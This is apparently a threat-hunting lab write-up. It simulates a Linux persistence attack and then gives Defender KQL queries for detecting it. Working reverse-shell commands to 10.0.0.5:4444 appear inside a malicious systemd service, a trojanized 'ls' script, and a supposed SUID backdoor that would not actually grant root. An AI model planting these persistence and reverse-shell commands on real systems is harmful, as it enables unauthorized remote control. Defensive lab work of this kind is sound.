# Threat Event (Persistence & Backdoor Access)

**Unauthorized Persistence Mechanisms & Backdoor Creation**

## Steps the "Bad Actor" took to Create Logs and IoCs:

1. Downloaded and installed a **malicious systemd service** to ensure the backdoor would automatically start on system reboot.
- The service was configured to run a reverse shell or malicious command to maintain access after rebooting the system.

```# Create a malicious systemd service that will ensure persistence by executing a reverse shell
echo '[Unit]
Description=Malicious Service
After=network.target

[Service]
ExecStart=/bin/bash -c "nc -e /bin/bash 10.0.0.5 4444"
Restart=always
User=root

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/malicious.service

# Enable and start the malicious service
sudo systemctl enable malicious.service
sudo systemctl start malicious.service
```

2. Replaced the legitimate `ls` command with a Trojanized script located at `/home/baddog/.local/bin/ls`.
- This Trojanized script was designed to execute a reverse shell when invoked, providing continued access to the system without raising suspicion.

```
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /home/baddog/.local/bin/ls
chmod +x /home/baddog/.local/bin/ls
```

3. **Created a backdoor shell at `/tmp/rootbash`, set the **SUID permission** on the shell (`chmod u+s /tmp/rootbash`), and made it executable by any user.
- This backdoor shell was designed to escalate privileges and grant root access, regardless of the user executing

```
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /tmp/rootbash
chmod u+s /tmp/rootbash
chmod +x /tmp/rootbash
```

---

## Tables Used to Detect IoCs:

| **Parameter** | **Description** |
|--------------|----------------|
| **Name** | DeviceProcessEvents |
| **Info** | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table |
| **Purpose** | Used to detect execution of Trojanized commands, privilege escalation attempts, and service creation. |

| **Parameter** | **Description** |
|--------------|----------------|
| **Name** | DeviceFileEvents |
| **Info** | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table |
| **Purpose** | Used to detect the creation and modification of system files, including systemd services and backdoor binaries. |

| **Parameter** | **Description** |
|--------------|----------------|
| **Name** | DeviceLogonEvents |
| **Info** | https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table |
| **Purpose** | Used to detect unauthorized remote logins or unusual authentication patterns. |

---

## Related Queries:

```kql
// Detect execution of a Trojanized administrative command
DeviceProcessEvents
| where ProcessCommandLine contains "ls"
| project Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine

// Detect execution of a SUID backdoor shell
DeviceProcessEvents
| where ProcessCommandLine contains "rootbash"
| project Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine

// Detect potential unauthorized logins
DeviceLogonEvents
| where AccountName contains "root"
| where LogonType in ("RemoteInteractive", "Interactive")
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType
```

---

## Created By:
- **Author Name**: James Harrington
- **Author Contact**: https://www.linkedin.com/in/Goodk47
- **Date**: January 30, 2025

## Validated By:
- **Reviewer Name**:
- **Reviewer Contact**:
- **Validation Date**:

---

## Additional Notes:
**None**
